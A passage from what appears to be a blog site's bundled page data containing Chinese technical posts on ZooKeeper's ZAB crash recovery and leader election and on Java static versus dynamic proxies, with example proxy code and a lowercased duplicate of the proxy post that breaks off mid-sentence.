情况二：客户端把消息写到leader了，但是leader还没发送proposal消息给其他节点，这个时候leader宕机了，leader宕机后恢复的时候此消息又该如何处理？\n\n\n# zab的崩溃恢复机制\n\n针对情况一，当leader宕机以后，zookeeper会选举出来新的leader，新的leader启动以后要到磁盘上面去检查是否存在没有commit的消息。\n\n如果存在，就继续检查看其他follower有没有对这条消息进行了commit，如果有过半节点对这条消息进行了ack，但是没有commit，那么新leader通知follower要完成commit的操作。\n\n\n# zab恢复中删除数据机制\n\n针对情况二，客户端把消息写到leader了，但是leader还没发送portal消息给其他节点，这个时候leader宕机了，这个时候对于用户来说，这条消息是写失败的。\n\n假设过了一段时间以后leader节点又恢复了，不过这个时候角色就变为了follower了，它在检查自己磁盘的时候会发现自己有一条消息没有进行commit，此时就会检测消息的编号。\n\n消息是有编号的，由高32位和低32位组成，高32位是用来体现是否发生过leader切换的，低32位就是展示消息的顺序的。这个时候当前的节点就会根据高32位知道目前leader已经切换过了，所以就把当前的消息删除，然后从新的leader同步数据，这样保证了数据一致性。\n\n\n# zk选主过程\n\n规则：\n\n 1. 初始阶段，都会给自己投票。\n\n 2. 当接收到来自其他服务器的投票时，都需要将别人的投票和自己的投票进行pk，规则如下：\n    \n    优先检查zxid。zxid比较大的服务器优先作为leader。如果zxid相同的话，就比较sid，sid比较大的服务器作为leader。\n\n举例：\n\n假设当前集群中有5台机器组成。\n\nsid（用来标识该机器在集群中的机器序号）分别为1，2，3，4，5。\n\nzxid（即zookeeper事务id号。zookeeper状态的每一次改变, 都对应着一个递增的transaction id, 该id称为zxid）分别为9，9，9，8，8。\n\n并且此时sid为2的机器是leader。\n\n某一时刻，1和2的服务器挂掉了，集群开始进行选主。\n\n * 在第一次投票中，由于无法检测到集群中其他机器的状态信息，因此每台机器都将自己作为被推举的对象来进行投票。于是sid为3，4，5的机器，投票情况分别为（3，9），（4，8），（5，8）\n * 每台机器把投票发出后，同时也会接收到来自另外两台机器的投票。\n * 对于server3来说，接收到（4，8），（5，8）的投票，对比后由于自己的zxid要大于收到的另外两个投票，因此不需要做任何变更。\n * 对于server4来说，接收到（3，9），（5，8）的投票，对比后由于（3，9）这个投票的zxid大于自己，因此需要变更投票为（3，9），然后继续将这个投票发送给另外两台机器。\n * 对于server5来说，接收到（3，9），（4，8）的投票，对比后由于（3，9）这个投票的zxid大于自己，因此需要变更投票为（3，9），然后继续将这个投票发送给另外两台机器。\n * 经过第二轮投票后，集群中的每台机器都会再次受到其他机器的投票，然后开始统计投票。判断是否有过半的机器收到相同的投票信息，如果有，那么该投票的sid会成为新的leader。\n * 机器总数为5台，server3，4，5都收到投票（3，9）。因此server3成为leader。\n\n\n# faq\n\nq:\n\n * 1.同一个客户端，先发出写请求，leader将写请求事务广播给follow，如果半数follow成功，但是发出请求的follow没有成功，按照半数即成功的原理，leader会返回写操作成功，此时该客户端再读取数据，导致读取到的是旧的值，不符合同一个session写后读的保证，此时该怎么办？\n\n * 2.leader对于一个事务在本地提交了，但是还没广播就down机了，那么从其余follow中选出的leader如何保证这个事务也被提交？\n   \n   zab在崩溃选择时，根据什么决定proposal该被抛弃或者该被提交？比如最开始有5台server, leader把日志复制到了另外2台，leader在本地提交日志（或者还没来得及提交），然后立即挂了。剩下4台server, 有2台有这个日志，有2台没有，那么这个日志要不要保留？\n\na:\n\n * 1.zookeeper不保证读一致性，是弱一致性，如果要保证读到的数据是最新的，读取之前要使用sync方法\n\n * 2.旧leader commit完就挂掉了，因为写入的follower肯定超过一半，新leader具有最大zxid，因此新leader就拥有commit的proposal，这时候只要提交该proposal并进行同步即可。如果旧leader只同步了一个follower就挂掉，该follower就是新leader，新leader同步该proposal然后同步即可。如果旧leader还没来得及同步就挂掉，该proposal在新集群中也不会存在，也不会成功，因此当旧leader恢复时就会被rollback。\n   \n   只要数据被写进新leader的log了，均不会丢失，zk只要选出了leader，数据就是从leader这里为准了。leader的选举规则可以额外看看，总之就是zxid最大的当选。那么什么数据会被同步呢？只要被记录到log中的事务都不会丢失。那么可能你会疑问，如果事务没提交呢？ leader在做restore的时候，会将日志中的proposal重新广播。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"动态代理和静态代理区别",frontmatter:{title:"动态代理和静态代理区别",date:"2022-03-02T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%92%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E5%8C%BA%E5%88%AB.html",relativePath:"views/backend/动态代理和静态代理区别.md",key:"v-c3918c52",path:"/views/backend/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%92%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E5%8C%BA%E5%88%AB.html",headers:[{level:2,title:"一、代理概念",slug:"一、代理概念",normalizedTitle:"一、代理概念",charIndex:3},{level:2,title:"二、静态代理",slug:"二、静态代理",normalizedTitle:"二、静态代理",charIndex:13},{level:2,title:"三、动态代理",slug:"三、动态代理",normalizedTitle:"三、动态代理",charIndex:23},{level:3,title:"1、先看看与动态代理紧密关联的Java API。",slug:"_1、先看看与动态代理紧密关联的java-api。",normalizedTitle:"1、先看看与动态代理紧密关联的java api。",charIndex:35},{level:3,title:"2、动态代理实现步骤",slug:"_2、动态代理实现步骤",normalizedTitle:"2、动态代理实现步骤",charIndex:65},{level:3,title:"3、动态代理实现示例",slug:"_3、动态代理实现示例",normalizedTitle:"3、动态代理实现示例",charIndex:81},{level:3,title:"4、动态代理机制特点",slug:"_4、动态代理机制特点",normalizedTitle:"4、动态代理机制特点",charIndex:97},{level:3,title:"5、动态代理的优点和美中不足",slug:"_5、动态代理的优点和美中不足",normalizedTitle:"5、动态代理的优点和美中不足",charIndex:113}],excerpt:"<Boxx/>\n",headersStr:"一、代理概念 二、静态代理 三、动态代理 1、先看看与动态代理紧密关联的Java API。 2、动态代理实现步骤 3、动态代理实现示例 4、动态代理机制特点 5、动态代理的优点和美中不足",content:' * 一、代理概念\n * 二、静态代理\n * 三、动态代理\n   * 1、先看看与动态代理紧密关联的Java API。\n   * 2、动态代理实现步骤\n   * 3、动态代理实现示例\n   * 4、动态代理机制特点\n   * 5、动态代理的优点和美中不足\n\n\n\n\n# 一、代理概念\n\n为某个对象提供一个代理，以控制对这个对象的访问。代理类和委托类有共同的父类或父接口，这样在任何使用委托类对象的地方都可以用代理对象替代。代理类负责请求的预处理、过滤、将请求分派给委托类处理、以及委托类执行完请求后的后续处理。\n\n\n\n从图中可以看出，代理接口（Subject）、代理类（ProxySubject）、委托类（RealSubject）形成一个“品”字结构。根据代理类的生成时间不同可以将代理分为静态代理和动态代理两种。\n\n下面以一个模拟需求说明静态代理和动态代理：委托类要处理一项耗时较长的任务，客户类需要打印出执行任务消耗的时间。解决这个问题需要记录任务执行前时间和任务执行后时间，两个时间差就是任务执行消耗的时间。\n\n\n# 二、静态代理\n\n由程序员创建或工具生成代理类的源码，再编译代理类。所谓静态也就是在程序运行前就已经存在代理类的字节码文件，代理类和委托类的关系在运行前就确定了。\n\n清单1：代理接口\n\n/**  \n * 代理接口。处理给定名字的任务。 \n */  \npublic interface Subject {  \n  /** \n   * 执行给定名字的任务。 \n    * @param taskName 任务名 \n   */  \n   public void dealTask(String taskName);   \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n清单2：委托类，具体处理业务。\n\n/** \n * 真正执行任务的类，实现了代理接口。 \n */  \npublic class RealSubject implements Subject {  \n\n /** \n  * 执行给定名字的任务。这里打印出任务名，并休眠500ms模拟任务执行了很长时间 \n  * @param taskName  \n  */  \n   @Override  \n   public void dealTask(String taskName) {  \n      System.out.println("正在执行任务："+taskName);  \n      try {  \n         Thread.sleep(500);  \n      } catch (InterruptedException e) {  \n         e.printStackTrace();  \n      }  \n   }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n清单3：静态代理类\n\n/** \n * 代理类，实现了代理接口。 \n */  \npublic class ProxySubject implements Subject {  \n //代理类持有一个委托类的对象引用  \n private Subject delegate;  \n\n public ProxySubject(Subject delegate) {  \n  this.delegate = delegate;  \n }  \n\n /** \n  * 将请求分派给委托类执行，记录任务执行前后的时间，时间差即为任务的处理时间 \n  *  \n  * @param taskName \n  */  \n @Override  \n public void dealTask(String taskName) {  \n  long stime = System.currentTimeMillis();   \n  //将请求分派给委托类处理  \n  delegate.dealTask(taskName);  \n  long ftime = System.currentTimeMillis();   \n  System.out.println("执行任务耗时"+(ftime - stime)+"毫秒");  \n\n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n清单4：生成静态代理类工厂\n\npublic class SubjectStaticFactory {  \n //客户类调用此工厂方法获得代理对象。  \n //对客户类来说，其并不知道返回的是代理类对象还是委托类对象。  \n public static Subject getInstance(){   \n  return new ProxySubject(new RealSubject());  \n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n清单5：客户类\n\npublic class Client1 {  \n\n public static void main(String[] args) {  \n  Subject proxy = SubjectStaticFactory.getInstance();  \n  proxy.dealTask("DBQueryTask");  \n }   \n\n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n静态代理类优缺点\n\n优点：业务类只需要关注业务逻辑本身，保证了业务类的重用性。这是代理的共有优点。\n\n缺点：\n\n * 代理对象的一个接口只服务于一种类型的对象，如果要代理的方法很多，势必要为每一种方法都进行代理，静态代理在程序规模稍大时就无法胜任了。\n * 如果接口增加一个方法，除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。\n\n\n# 三、动态代理\n\n动态代理类的源码是在程序运行期间由JVM根据反射等机制动态的生成，所以不存在代理类的字节码文件。代理类和委托类的关系是在程序运行时确定。\n\n\n# 1、先看看与动态代理紧密关联的Java API。\n\n1）java.lang.reflect.Proxy\n\n这是 Java 动态代理机制生成的所有动态代理类的父类，它提供了一组静态方法来为一组接口动态地生成代理类及其对象。\n\n清单6：Proxy类的静态方法\n\n// 方法 1: 该方法用于获取指定代理对象所关联的调用处理器  \nstatic InvocationHandler getInvocationHandler(Object proxy)   \n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象  \nstatic Class getProxyClass(ClassLoader loader, Class[] interfaces)   \n\n// 方法 3：该方法用于判断指定类对象是否是一个动态代理类  \nstatic boolean isProxyClass(Class cl)   \n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例  \nstatic Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h)   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2）java.lang.reflect.InvocationHandler\n\n这是调用处理器接口，它自定义了一个 invoke 方法，用于集中处理在动态代理类对象上的方法调用，通常在该方法中实现对委托类的代理访问。每次生成动态代理类对象时都要指定一个对应的调用处理器对象。\n\n清单7：InvocationHandler的核心方法\n\n// 该方法负责集中处理动态代理类上的所有方法调用。\n// 第一个参数既是代理类实例，\n// 第二个参数是被调用的方法对象，\n// 第三个方法是调用参数。\n// 调用处理器根据这三个参数进行预处理或分派到委托类实例上反射执行  \nObject invoke(Object proxy, Method method, Object[] args)   \n\n\n1\n2\n3\n4\n5\n6\n\n\n3）java.lang.ClassLoader\n\n这是类装载器类，负责将类的字节码装载到 Java 虚拟机（JVM）中并为其定义类对象，然后该类才能被使用。Proxy 静态方法生成动态代理类同样需要通过类装载器来进行装载才能使用，它与普通类的唯一区别就是其字节码是由 JVM 在运行时动态生成的而非预存在于任何一个 .class 文件中。\n\n每次生成动态代理类对象时都需要指定一个类装载器对象。\n\n\n# 2、动态代理实现步骤\n\n具体步骤是：\n\n * 实现InvocationHandler接口创建自己的调用处理器\n * 给Proxy类提供ClassLoader和代理接口类型数组创建动态代理类\n * 以调用处理器类型为参数，利用反射机制得到动态代理类的构造函数\n * 以调用处理器对象为参数，利用动态代理类的构造函数创建动态代理类对象\n\n清单8：分步骤实现动态代理\n\n// InvocationHandlerImpl 实现了 InvocationHandler 接口，\n// 并能实现方法调用从代理类到委托类的分派转发，\n// 其内部通常包含指向委托类实例的引用，用于真正执行分派转发过来的方法调用  \nInvocationHandler handler = new InvocationHandlerImpl(..);   \n\n// 通过 Proxy 为包括 Interface 接口在内的一组接口动态创建代理类的类对象  \nClass clazz = Proxy.getProxyClass(classLoader, new Class[] { Interface.class, ... });   \n\n// 通过反射从生成的类对象获得构造函数对象  \nConstructor constructor = clazz.getConstructor(new Class[] { InvocationHandler.class });   \n\n// 通过构造函数对象创建动态代理类实例  \nInterface Proxy = (Interface)constructor.newInstance(new Object[] { handler });   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nProxy类的静态方法newProxyInstance对上面具体步骤的后三步做了封装，简化了动态代理对象的获取过程。\n\n清单9：简化后的动态代理实现\n\n// InvocationHandlerImpl 实现了 InvocationHandler 接口，并能实现方法调用从代理类到委托类的分派转发  \nInvocationHandler handler = new InvocationHandlerImpl(..);   \n\n// 通过 Proxy 直接创建动态代理类实例  \nInterface proxy = (Interface)Proxy.newProxyInstance( classLoader,   \n     new Class[] { Interface.class },  handler );  \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3、动态代理实现示例\n\n清单10：创建自己的调用处理器\n\n/** \n * 动态代理类对应的调用处理程序类 \n */  \npublic class SubjectInvocationHandler implements InvocationHandler {  \n\n //代理类持有一个委托类的对象引用  \n private Object delegate;  \n\n public SubjectInvocationHandler(Object delegate) {  \n  this.delegate = delegate;  \n }  \n\n @Override  \n public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  \n  long stime = System.currentTimeMillis();   \n  //利用反射机制将请求分派给委托类处理。Method的invoke返回Object对象作为方法执行结果。  \n  //因为示例程序没有返回值，所以这里忽略了返回值处理  \n  method.invoke(delegate, args);  \n  long ftime = System.currentTimeMillis();   \n  System.out.println("执行任务耗时"+(ftime - stime)+"毫秒");  \n\n  return null;  \n }  \n}   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n清单11：生成动态代理对象的工厂，工厂方法列出了如何生成动态代理类对象的步骤。\n\n/** \n * 生成动态代理对象的工厂. \n */  \npublic class DynProxyFactory {  \n //客户类调用此工厂方法获得代理对象。  \n //对客户类来说，其并不知道返回的是代理类对象还是委托类对象。  \n public static Subject getInstance(){   \n  Subject delegate = new RealSubject();  \n  InvocationHandler handler = new SubjectInvocationHandler(delegate);  \n  Subject proxy = null;  \n  proxy = (Subject)Proxy.newProxyInstance(  \n    delegate.getClass().getClassLoader(),   \n    delegate.getClass().getInterfaces(),   \n    handler);  \n  return proxy;  \n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n清单12：动态代理客户类\n\npublic class Client {  \n\n public static void main(String[] args) {  \n\n  Subject proxy = DynProxyFactory.getInstance();  \n  proxy.dealTask("DBQueryTask");  \n }   \n\n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 4、动态代理机制特点\n\n首先是动态生成的代理类本身的一些特点。\n\n1）包：如果所代理的接口都是 public 的，那么它将被定义在顶层包（即包路径为空），如果所代理的接口中有非 public 的接口（因为接口不能被定义为 protect 或 private，所以除 public 之外就是默认的 package 访问级别），那么它将被定义在该接口所在包（假设代理了 com.ibm.developerworks 包中的某非 public 接口 A，那么新生成的代理类所在的包就是 com.ibm.developerworks），这样设计的目的是为了最大程度的保证动态代理类不会因为包管理的问题而无法被成功定义并访问；\n\n2）类修饰符：该代理类具有 final 和 public 修饰符，意味着它可以被所有的类访问，但是不能被再度继承；\n\n3）类名：格式是“$ProxyN”，其中 N 是一个逐一递增的阿拉伯数字，代表 Proxy 类第 N 次生成的动态代理类，值得注意的一点是，并不是每次调用 Proxy 的静态方法创建动态代理类都会使得 N 值增加，原因是如果对同一组接口（包括接口排列的顺序相同）试图重复创建动态代理类，它会很聪明地返回先前已经创建好的代理类的类对象，而不会再尝试去创建一个全新的代理类，这样可以节省不必要的代码重复生成，提高了代理类的创建效率。\n\n4）类继承关系：该类的继承关系如图：\n\n\n\n由图可见，Proxy 类是它的父类，这个规则适用于所有由 Proxy 创建的动态代理类。而且该类还实现了其所代理的一组接口，这就是为什么它能够被安全地类型转换到其所代理的某接口的根本原因。\n\n接下来让我们了解一下代理类实例的一些特点。每个实例都会关联一个调用处理器对象，可以通过 Proxy 提供的静态方法 getInvocationHandler 去获得代理类实例的调用处理器对象。在代理类实例上调用其代理的接口中所声明的方法时，这些方法最终都会由调用处理器的 invoke 方法执行。\n\n此外，值得注意的是，代理类的根类 java.lang.Object 中有三个方法也同样会被分派到调用处理器的 invoke 方法执行，它们是 hashCode，equals 和 toString，可能的原因有：一是因为这些方法为 public 且非 final 类型，能够被代理类覆盖；二是因为这些方法往往呈现出一个类的某种特征属性，具有一定的区分度，所以为了保证代理类与委托类对外的一致性，这三个方法也应该被分派到委托类执行。当代理的一组接口有重复声明的方法且该方法被调用时，代理类总是从排在最前面的接口中获取方法对象并分派给调用处理器，而无论代理类实例是否正在以该接口（或继承于该接口的某子接口）的形式被外部引用，因为在代理类内部无法区分其当前的被引用类型。\n\n接着来了解一下被代理的一组接口有哪些特点。首先，要注意不能有重复的接口，以避免动态代理类代码生成时的编译错误。其次，这些接口对于类装载器必须可见，否则类装载器将无法链接它们，将会导致类定义失败。再次，需被代理的所有非 public 的接口必须在同一个包中，否则代理类生成也会失败。最后，接口的数目不能超过 65535，这是 JVM 设定的限制。\n\n最后再来了解一下异常处理方面的特点。从调用处理器接口声明的方法中可以看到理论上它能够抛出任何类型的异常，因为所有的异常都继承于 Throwable 接口，但事实是否如此呢？\n\n答案是否定的，原因是我们必须遵守一个继承原则：即子类覆盖父类或实现父接口的方法时，抛出的异常必须在原方法支持的异常列表之内。所以虽然调用处理器理论上讲能够，但实际上往往受限制，除非父接口中的方法支持抛 Throwable 异常。那么如果在 invoke 方法中的确产生了接口方法声明中不支持的异常，那将如何呢？\n\n放心，Java 动态代理类已经为我们设计好了解决方法：它将会抛出 UndeclaredThrowableException 异常。这个异常是一个 RuntimeException 类型，所以不会引起编译错误。通过该异常的 getCause 方法，还可以获得原来那个不受支持的异常对象，以便于错误诊断。\n\n\n# 5、动态代理的优点和美中不足\n\n优点：\n\n动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（InvocationHandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。在本示例中看不出来，因为invoke方法体内嵌入了具体的外围业务（记录任务处理前后时间并计算时间差），实际中可以类似Spring AOP那样配置外围业务。\n\n美中不足：\n\n诚然，Proxy 已经设计得非常优美，但是还是有一点点小小的遗憾之处，那就是它始终无法摆脱仅支持 interface 代理的桎梏，因为它的设计注定了这个遗憾。回想一下那些动态生成的代理类的继承关系图，它们已经注定有一个共同的父类叫 Proxy。Java 的继承机制注定了这些动态代理类们无法实现对 class 的动态代理，原因是多继承在 Java 中本质上就行不通。\n\n有很多条理由，人们可以否定对 class 代理的必要性，但是同样有一些理由，相信支持 class 动态代理会更美好。接口和类的划分，本就不是很明显，只是到了 Java 中才变得如此的细化。如果只从方法的声明及是否被定义来考量，有一种两者的混合体，它的名字叫抽象类。实现对抽象类的动态代理，相信也有其内在的价值。此外，还有一些历史遗留的类，它们将因为没有实现任何接口而从此与动态代理永世无缘。如此种种，不得不说是一个小小的遗憾。',normalizedContent:' * 一、代理概念\n * 二、静态代理\n * 三、动态代理\n   * 1、先看看与动态代理紧密关联的java api。\n   * 2、动态代理实现步骤\n   * 3、动态代理实现示例\n   * 4、动态代理机制特点\n   * 5、动态代理的优点和美中不足\n\n\n\n\n# 一、代理概念\n\n为某个对象提供一个代理，以控制对这个对象的访问。代理类和委托类有共同的父类或父接口，这样在任何使用委托类对象的地方都可以用代理对象替代。代理类负责请求的预处理、过滤、将请求分派给委托类处理、以及委托类执行完请求后的后续处理。\n\n\n\n从图中可以看出，代理接口（subject）、代理类（proxysubject）、委托类（realsubject）形成一个“品”字结构。根据代理类的生成时间不同可以将代理分为静态代理和动态代理两种。\n\n下面以一个模拟需求说明静态代理和动态代理：委托类要处理一项耗时较长的任务，客户类需要打印出执行任务消耗的时间。解决这个问题需要记录任务执行前时间和任务执行后时间，两个时间差就是任务执行消耗的时间。\n\n\n# 二、静态代理\n\n由程序员创建或工具生成代理类的源码，再编译代理类。所谓静态也就是在程序运行前就已经存在代理类的字节码文件，代理类和委托类的关系在运行前就确定了。\n\n清单1：代理接口\n\n/**  \n * 代理接口。处理给定名字的任务。 \n */  \npublic interface subject {  \n  /** \n   * 执行给定名字的任务。 \n    * @param taskname 任务名 \n   */  \n   public void dealtask(string taskname);   \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n清单2：委托类，具体处理业务。\n\n/** \n * 真正执行任务的类，实现了代理接口。 \n */  \npublic class realsubject implements subject {  \n\n /** \n  * 执行给定名字的任务。这里打印出任务名，并休眠500ms模拟任务执行了很长时间 \n  * @param taskname  \n  */  \n   @override  \n   public void dealtask(string taskname) {  \n      system.out.println("正在执行任务："+taskname);  \n      try {  \n         thread.sleep(500);  \n      } catch (interruptedexception e) {  \n         e.printstacktrace();  \n      }  \n   }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n清单3：静态代理类\n\n/** \n * 代理类，实现了代理接口。 \n */  \npublic class proxysubject implements subject {  \n //代理类持有一个委托类的对象引用  \n private subject delegate;  \n\n public proxysubject(subject delegate) {  \n  this.delegate = delegate;  \n }  \n\n /** \n  * 将请求分派给委托类执行，记录任务执行前后的时间，时间差即为任务的处理时间 \n  *  \n  * @param taskname \n  */  \n @override  \n public void dealtask(string taskname) {  \n  long stime = system.currenttimemillis();   \n  //将请求分派给委托类处理  \n  delegate.dealtask(taskname);  \n  long ftime = system.currenttimemillis();   \n  system.out.println("执行任务耗时"+(ftime - stime)+"毫秒");  \n\n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n清单4：生成静态代理类工厂\n\npublic class subjectstaticfactory {  \n //客户类调用此工厂方法获得代理对象。  \n //对客户类来说，其并不知道返回的是代理类对象还是委托类对象。  \n public static subject getinstance(){   \n  return new proxysubject(new realsubject());  \n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n清单5：客户类\n\npublic class client1 {  \n\n public static void main(string[] args) {  \n  subject proxy = subjectstaticfactory.getinstance();  \n  proxy.dealtask("dbquerytask");  \n }   \n\n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n静态代理类优缺点\n\n优点：业务类只需要关注业务逻辑本身，保证了业务类的重用性。这是代理的共有优点。\n\n缺点：\n\n * 代理对象的一个接口只服务于一种类型的对象，如果要代理的方法很多，势必要为每一种方法都进行代理，静态代理在程序规模稍大时就无法胜任了。\n * 如果接口增加一个方法，除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。\n\n\n# 三、动态代理\n\n动态代理类的源码是在程序运行期间由jvm根据反射等机制动态的生成，所以不存在代理类的字节码文件。代理类和委托类的关系是在程序运行时确定。\n\n\n# 1、先看看与动态代理紧密关联的java api。\n\n1）java.lang.reflect.proxy\n\n这是 java 动态代理机制生成的所有动态代理类的父类，它提供了一组静态方法来为一组接口动态地生成代理类及其对象。\n\n清单6：proxy类的静态方法\n\n// 方法 1: 该方法用于获取指定代理对象所关联的调用处理器  \nstatic invocationhandler getinvocationhandler(object proxy)   \n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象  \nstatic class getproxyclass(classloader loader, class[] interfaces)   \n\n// 方法 3：该方法用于判断指定类对象是否是一个动态代理类  \nstatic boolean isproxyclass(class cl)   \n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例  \nstatic object newproxyinstance(classloader loader, class[] interfaces, invocationhandler h)   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2）java.lang.reflect.invocationhandler\n\n这是调用处理器接口，它自定义了一个 invoke 方法，用于集中处理在动态代理类对象上的方法调用，通常在该方法中实现对委托类的代理访问。每次生成动态代理类对象时都要指定一个对应的调用处理器对象。\n\n清单7：invocationhandler的核心方法\n\n// 该方法负责集中处理动态代理类上的所有方法调用。\n// 第一个参数既是代理类实例，\n// 第二个参数是被调用的方法对象，\n// 第三个方法是调用参数。\n// 调用处理器根据这三个参数进行预处理或分派到委托类实例上反射执行  \nobject invoke(object proxy, method method, object[] args)   \n\n\n1\n2\n3\n4\n5\n6\n\n\n3）java.lang.classloader\n\n这是类装载器类，负责将类的字节码装载到 java 虚拟机（jvm）中并为其定义类对象，然后该类才能被使用。proxy 静态方法生成动态代理类同样需要通过类装载器来进行装载才能使用，它与普通类的唯一区别就是其字节码是由 jvm 在运行时动态生成的而非预存在于任何一个 .class 文件中。\n\n每次生成动态代理类对象时都需要指定一个类装载器对象。\n\n\n# 2、动态代理实现步骤\n\n具体步骤是：\n\n * 实现invocationhandler接口创建自己的调用处理器\n * 给proxy类提供classloader和代理接口类型数组创建动态代理类\n * 以调用处理器类型为参数，利用反射机制得到动态代理类的构造函数\n * 以调用处理器对象为参数，利用动态代理类的构造函数创建动态代理类对象\n\n清单8：分步骤实现动态代理\n\n// invocationhandlerimpl 实现了 invocationhandler 接口，\n// 并能实现方法调用从代理类到委托类的分派转发，\n// 其内部通常包含指向委托类实例的引用，用于真正执行分派转发过来的方法调用  \ninvocationhandler handler = new invocationhandlerimpl(..);   \n\n// 通过 proxy 为包括 interface 接口在内的一组接口动态创建代理类的类对象  \nclass clazz = proxy.getproxyclass(classloader, new class[] { interface.class, ... });   \n\n// 通过反射从生成的类对象获得构造函数对象  \nconstructor constructor = clazz.getconstructor(new class[] { invocationhandler.class });   \n\n// 通过构造函数对象创建动态代理类实例  \ninterface proxy = (interface)constructor.newinstance(new object[] { handler });   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nproxy类的静态方法newproxyinstance对上面具体步骤的后三步做了封装，简化了动态代理对象的获取过程。\n\n清单9：简化后的动态代理实现\n\n// invocationhandlerimpl 实现了 invocationhandler 接口，并能实现方法调用从代理类到委托类的分派转发  \ninvocationhandler handler = new invocationhandlerimpl(..);   \n\n// 通过 proxy 直接创建动态代理类实例  \ninterface proxy = (interface)proxy.newproxyinstance( classloader,   \n     new class[] { interface.class },  handler );  \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3、动态代理实现示例\n\n清单10：创建自己的调用处理器\n\n/** \n * 动态代理类对应的调用处理程序类 \n */  \npublic class subjectinvocationhandler implements invocationhandler {  \n\n //代理类持有一个委托类的对象引用  \n private object delegate;  \n\n public subjectinvocationhandler(object delegate) {  \n  this.delegate = delegate;  \n }  \n\n @override  \n public object invoke(object proxy, method method, object[] args) throws throwable {  \n  long stime = system.currenttimemillis();   \n  //利用反射机制将请求分派给委托类处理。method的invoke返回object对象作为方法执行结果。  \n  //因为示例程序没有返回值，所以这里忽略了返回值处理  \n  method.invoke(delegate, args);  \n  long ftime = system.currenttimemillis();   \n  system.out.println("执行任务耗时"+(ftime - stime)+"毫秒");  \n\n  return null;  \n }  \n}   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n清单11：生成动态代理对象的工厂，工厂方法列出了如何生成动态代理类对象的步骤。\n\n/** \n * 生成动态代理对象的工厂. \n */  \npublic class dynproxyfactory {  \n //客户类调用此工厂方法获得代理对象。  \n //对客户类来说，其并不知道返回的是代理类对象还是委托类对象。  \n public static subject getinstance(){   \n  subject delegate = new realsubject();  \n  invocationhandler handler = new subjectinvocationhandler(delegate);  \n  subject proxy = null;  \n  proxy = (subject)proxy.newproxyinstance(  \n    delegate.getclass().getclassloader(),   \n    delegate.getclass().getinterfaces(),   \n    handler);  \n  return proxy;  \n }  \n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n清单12：动态代理客户类\n\npublic class client {  \n\n public static void main(string[] args) {  \n\n  subject proxy = dynproxyfactory.getinstance();  \n  proxy.dealtask("dbquerytask");  \n }   \n\n}  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 4、动态代理机制特点\n\n首先是动态生成的代理类本身的一些特点。\n\n1）包：如果所代理的接口都是 public 的，那么它将被定义在顶层包（即包路径为空），如果所代理的接口中有非 public 的接口（因为接口不能被定义为 protect 或 private，所以除 public 之外就是默认的 package 访问级别），那么它将被定义在该接口所在包（假设代理了 com.ibm.developerworks 包中的某非 public 接口 a，那么新生成的代理类所在的包就是 com.ibm.developerworks），这样设计的目的是为了最大程度的保证动态代理类不会因为包管理的问题而无法被成功定义并访问；\n\n2）类修饰符：该代理类具有 final 和 public 修饰符，意味着它可以被所有的类访问，但是不能被再度继承；\n\n3）类名：格式是“$proxyn”，其中 n 是一个逐一递增的阿拉伯数字，代表 proxy 类第 n 